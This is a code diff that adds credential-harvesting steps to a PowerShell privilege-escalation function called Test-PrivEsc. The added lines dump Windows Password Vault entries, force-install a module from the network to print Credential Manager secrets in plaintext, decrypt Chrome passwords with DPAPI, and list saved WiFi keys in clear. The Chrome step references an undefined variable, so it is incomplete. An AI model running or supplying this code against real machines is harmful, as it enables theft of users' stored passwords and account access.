@@ -98,6 +98,20 @@ Function Test-PrivEsc {
             }  # End If 
 
         }  # End ForEach 
+        
+        Write-Verbose "Checking for passwords in the Windows Password vault"
+        [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
+
+        Write-Verbose "Checking Credential Manager for stored credentials"
+        Install-Module -Name CredentialManager -Force
+        Import-Module -Name CredentialManager -Force
+        Get-StoredCredential | ForEach-Object { Write-Host -NoNewLine $_.Username; Write-Host -NoNewLine ":" ; $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P); }
+
+        Write-Verbose "Dumping passwords from Google Chrome"
+        [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+
+        Write-Verbose "Dumping WiFi passwords"
+        (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 #============================================================================================================
 #  AlwaysInstallElevated PRIVESC
 #============================================================================================================
